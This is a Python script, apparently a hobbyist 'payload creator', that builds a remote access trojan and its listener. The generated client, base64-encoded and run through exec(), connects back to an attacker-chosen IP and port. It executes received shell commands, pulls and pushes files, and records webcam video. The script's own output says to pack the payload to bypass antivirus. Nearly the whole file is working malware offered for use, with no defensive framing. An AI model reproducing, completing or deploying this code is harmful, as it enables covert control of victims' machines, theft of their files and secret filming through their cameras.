import base64, subprocess as sp, os
from os import system
import time
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=71))
system('clear')
# terminal colors
RED = "\033[1;31m"  
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;93m"
NORMAL = "\033[1;37m"
BOLD = "\033[;1m"
BASIC = "\033[0;0m"
HYELLOW = "\033[41;33m"
YELLOW_UNDERLINE = "\033[4;93m"
print("{R}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{N}".format(R=RED, N=NORMAL, B=BOLD))
print("{N}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{N}".format(R=RED, N=NORMAL, B=BOLD))
print("{R}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{R}".format(R=RED, N=NORMAL, B=BOLD))
print(''':   _____ _   _ _     _        ____ ___  _   _ _____  _    ____ _____ :
:  |  ___| | | | |   | |      / ___/ _ \| \ | |_   _|/ \  / ___|_   _|:
:  | |_  | | | | |   | |     | |  | | | |  \| | | | / _ \| |     | |  :
:  |  _| | |_| | |___| |___  | |__| |_| | |\  | | |/ ___ \ |___  | |  :
:  |_|    \___/|_____|_____|  \____\___/|_| \_| |_/_/   \_\____| |_|  :
:                                                                     :''')
print("{R}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{N}".format(R=RED, N=NORMAL, B=BOLD))
print("{N}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{N}".format(R=RED, N=NORMAL, B=BOLD))
print("{R}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{N}".format(R=RED, N=NORMAL, B=BOLD))
print("{R}[{G}+{R}]{G} Version 1.0.1".format(R=RED, G=GREEN, N=NORMAL))
print("{R}[{G}+{R}]{G} Developped by T3nsh0".format(R=RED, G=GREEN, N=NORMAL))
print("{R}[{G}!{R}]{G} Don't upload online !".format(R=RED, G=GREEN, N=NORMAL))
print("\n{R}[ {HY}MAIN PAYLOAD CREATOR{B}{R} ]".format(N=NORMAL, R=RED, HY=HYELLOW, B=BASIC))
ipv4="ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'"
result=sp.Popen(ipv4, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
ipv4, err=result.communicate()
lenth=len(ipv4)
lenth=lenth-1
ipv4=ipv4[:lenth]
ipv4=ipv4.decode()
ipv4=str(ipv4)
print("Your {Y}IP{R} is{Y}".format(Y=YELLOW, R=RED),ipv4,"{R}.{Y}".format(Y=YELLOW, R=RED))
ip=input("{}LISTENER IP{}{} > ".format(YELLOW_UNDERLINE,BASIC, YELLOW))
print("{R}[{G}+{R}]{G} IP :{Y}".format(R=RED, G=GREEN, N=NORMAL, Y=YELLOW), ip)
print("{Y}Use port {R}larger {Y}than {R}1024{Y}".format(Y=YELLOW, R=RED, B=BASIC))
port=input("{}LISTENER PORT{}{} > ".format(YELLOW_UNDERLINE, BASIC, YELLOW))
port=int(port)
print("{R}[{G}+{R}]{G} PORT :{Y}".format(R=RED, G=GREEN, N=NORMAL, Y=YELLOW), port)
print("{R}Payload {Y}final {R}name {B}".format(Y=YELLOW, R=RED, B=BASIC))
outputname=input("{}OUTPUT NAME{}{} > ".format(YELLOW_UNDERLINE, BASIC, YELLOW))
outputname=str(outputname)
if not outputname.endswith(".py"):
	ext=".py"
	lenth=len(outputname)
	outputname=outputname[:lenth] + ext
time.sleep(1)
payload='''import socket, socketserver, time
import os
import subprocess as sp
import datetime
#from PIL import ImageGrab

hote = "{}"
port = {}
connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_avec_serveur.connect((hote, port))

cmd = b""
while cmd != b"exit":
	cmd = connexion_avec_serveur.recv(1024)
	if cmd[:3] != b"get" and cmd[:6] != b"upload" and cmd[:6] != b"stream" and cmd != b"exit" and cmd[:2] != b"cd":
		print(cmd.decode())
		result=sp.Popen(cmd, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
		result_cmd, err_cmd=result.communicate()
		if result_cmd:
			connexion_avec_serveur.send(result_cmd + err_cmd)
		else:
			#si le ls affiche rien
			send = b"Result is null"
			connexion_avec_serveur.send(send)
	#Si la commande est "cd xxx " alors :
	if cmd[:6] == b"stream":
		print(cmd)
		cap = cv2.VideoCapture(0)
		t = datetime.datetime.now()
		temps_depart = t.year * 31557600
		temps_depart += t.month * 2629800
		temps_depart += t.day * 86400
		temps_depart += t.hour * 3600
		temps_depart += t.minute * 60
		temps_depart += t.second
		print("Nous sommes a  secondes".format(temps_depart))
		Temps_de_film = cmd[7:]
		Temps_de_film = int(Temps_de_film)
		Temps_fin_film = temps_depart + Temps_de_film
		print("Film jusqu'a  secondes".format(Temps_fin_film))
		# Check if camera opened successfully
		if (cap.isOpened() == False): 
		  print("Unable to read camera feed")
		 
		# Default resolutions of the frame are obtained.The default resolutions are system dependent.
		# We convert the resolutions from float to integer.
		frame_width = int(cap.get(3))
		frame_height = int(cap.get(4))
		 
		# Define the codec and create VideoWriter object.The output is stored in 'outpy.avi' file.
		out = cv2.VideoWriter('outpy.avi',cv2.VideoWriter_fourcc('M','J','P','G'), 14, (frame_width,frame_height))
		while temps_depart < Temps_fin_film:
		  t = datetime.datetime.now()
		  temps_depart = t.year * 31557600
		  temps_depart += t.month * 2629800
		  temps_depart += t.day * 86400
		  temps_depart += t.hour * 3600
		  temps_depart += t.minute * 60
		  temps_depart += t.second
		  ret, frame = cap.read()
		 
		  if ret == True: 
		     
		    # Write the frame into the file 'output.avi'
		    out.write(frame)
		 
		    # Display the resulting frame    
		 
		    # Press Q on keyboard to stop recording
		 
		  # Break the loop
		  else:
		    break 
		t2 = datetime.datetime.now()
		temps_final = t2.year * 31557600
		temps_final += t2.month * 2629800
		temps_final += t2.day * 86400
		temps_final += t2.hour * 3600
		temps_final += t2.minute * 60
		temps_final += t2.second
		print("Nous sommes a secondes maintenant".format(temps_final))
		# When everything done, release the video capture and video write objects
		cap.release()
		out.release()
		file = open('outpy.avi', 'rb')
		data = file.read(999999999)
		connexion_avec_serveur.send(data)
		file.close()
		#os.remove('outpy.avi')
			
	if b'cd' in cmd[:2]:
		#ptdrr le truc de fegnant
		print(cmd.decode())
		os.chdir(cmd[3:])
		connexion_avec_serveur.send(b"Succefully changed directory")
	if b'get' in cmd[:3]:
		filename = cmd[4:]
		file = open(filename, 'rb')
		data = file.read(20000)
		connexion_avec_serveur.send(data)
		file.close()
	if cmd.startswith(b'upload'):
		print("test ok")
		data = connexion_avec_serveur.recv(20000)
		filename = cmd[7:]
		file = open(filename, 'wb')
		file.write(data)
		file.close()
	if cmd == b"exit":
		connexion_avec_serveur.close()

	#Le code du screen 
	#screen = ImageGrab.grab(bbox=(0,0,1000,700))
	#screen.save("screen.png")
print("Fermeture de la connexion")
'''.format(ip, port)
payload=payload.encode()
payload=base64.b64encode(payload)
payload=payload.decode()
print("{R}[{G}+{R}]{R} RAW{G} payload {R}generated".format(R=RED, G=GREEN, N=NORMAL))
time.sleep(1)
finalpayload='''
import base64
cmd=base64.b64decode("{}")
while True:
	exec(cmd)
'''.format(payload)
finalpayload=finalpayload.encode()
file=open(outputname, 'wb')
file.write(finalpayload)
file.close()
print("{R}[{G}+{R}]{R} Encoded{G} payload {R}generated".format(R=RED, G=GREEN, N=NORMAL))
time.sleep(1)
#CREATE LISTENER
listener='''
import socket, time, pickle, struct
import numpy as np

hote = '{}'

port = {}

connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_principale.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_principale.bind((hote, port))

connexion_principale.listen(5)

print("Listening on port : {}")
connexion_avec_client, infos_connexion = connexion_principale.accept()


msg_a_envoyer = ""
while msg_a_envoyer != b"exit":
	msg_a_envoyer = input("T3nsh0> ")
	#si la longueur est strictement inferieure a 1, et ben on fait rien fdp
	if len(msg_a_envoyer) > 0 :
		msg_a_envoyer = msg_a_envoyer.encode()

		if msg_a_envoyer.startswith(b'upload'):
			connexion_avec_client.send(msg_a_envoyer)
			filename = msg_a_envoyer[7:]
			try:
				file = open(filename, 'rb')
				data = file.read(20000)
				connexion_avec_client.send(data)
				print("[+] Sent file with success !")
				file.close()
			except FileNotFoundError:
				print("This isn't a valid name")

		if msg_a_envoyer.startswith(b'get'):
			connexion_avec_client.send(msg_a_envoyer)
			filename = msg_a_envoyer[4:]
			file = open(filename, 'wb')
			data = connexion_avec_client.recv(20000)
			print("[+] Got file with success !")
			file.write(data)
			file.close()

		if msg_a_envoyer[:6] == b"stream":
			print("Streaming...")
			connexion_avec_client.send(msg_a_envoyer)
			#On attend le retour video
			data=connexion_avec_client.recv(5000000)
			file = open('output.avi', 'wb')
			print("[+] Got file with success !")
			file.write(data)
			file.close()
		if msg_a_envoyer == b"help":
			print("List of commands :")
			print("get [FILE]")
			print("upload [FILE]")

		if msg_a_envoyer[:3] != b'get' and msg_a_envoyer != b'exit' and msg_a_envoyer[:6] != b'upload' and msg_a_envoyer[:6] != b'stream' and msg_a_envoyer != b'help':
			connexion_avec_client.send(msg_a_envoyer)
			result = connexion_avec_client.recv(999999999)
			if result:
				result=result.decode('cp850')
				print(result)

msg_a_envoyer = b"exit"
print("Fermeture de la connexion")
connexion_avec_client.close()
connexion_principale.close()'''.format(ip, port, port)
listener=listener.encode()
lenth=len(outputname)
lenth = lenth - 3
servername=outputname[:lenth] + "_listener.py"
file=open(servername, 'wb')
file.write(listener)
file.close()
print("{R}[{G}+{R}]{R} Listener{G} file {R}generated".format(R=RED, G=GREEN, N=NORMAL))
print("Now you have to : \nCompile on a Windows with auto-py-to-exe\nBuild with BoxedApp packer to bypass AV")
''' TO ADD IN NEXT UPDATE
compil=input("Would you like to compile payload into exe ? y/n ")
if compil=="y":
	pwd=sp.Popen("pwd", stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
	pwd, err=pwd.communicate()
	pwd=pwd.replace(b"\\n", b"")
	pwd=pwd.decode()
	l=len(pwd)
	ext="/"
	pwd_final = pwd[:l] + ext
	l=len(pwd_final)
	pwd_final = pwd_final[:l] + outputname
	print(pwd_final)
	cmd = "pyinstaller -y -F -w  pwd" + pwd_final
	print(cmd)
	exe=sp.Popen(cmd, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)'''
